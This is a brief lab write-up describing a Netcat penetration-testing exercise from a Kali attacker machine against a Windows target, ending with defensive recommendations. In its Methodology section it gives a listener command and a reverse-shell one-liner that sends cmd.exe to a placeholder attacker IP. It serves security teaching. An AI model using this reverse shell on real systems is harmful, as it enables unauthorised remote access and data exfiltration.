# Netcat Penetration Testing Lab

##  Objective
To understand and demonstrate how Netcat can be used for penetration testing tasks such as reverse shells, port listening, and file transfer.

##  Tools Used
- Netcat (nc / ncat)
- Kali Linux (Attacker Machine)
- Windows (Target Machine)

##  Methodology

### 1. Port Listening (Attacker)
- Used Netcat to listen on a specific port
- Command:
  nc -lvnp 4444

### 2. Reverse Shell (Target)
- Established reverse shell from Windows to Kali Linux
- Command:
  ncat <Attacker-IP> 4444 -e cmd.exe

### 3. Remote Command Execution
- Gained access to target system shell
- Executed commands like:
  - ipconfig
  - systeminfo

### 4. File Transfer
- Transferred files between attacker and target machines
- Used Netcat for sending and receiving files

##  Key Concepts
- Reverse Shell
- Bind Shell
- TCP Communication
- Remote Access

##  Result
- Successfully established reverse shell connection
- Executed commands remotely on target system
- Demonstrated file transfer using Netcat

##  Security Risks
- Unauthorized remote access
- Data exfiltration
- Backdoor creation

##  Recommendations
- Block unused ports
- Use firewall rules
- Monitor unusual network activity
- Disable unnecessary services

##  Project Files
- Netcat_Penetration_Testing_Report.pdf

##  Key Skills
Network Penetration Testing, Netcat, Reverse Shell, TCP/IP Networking
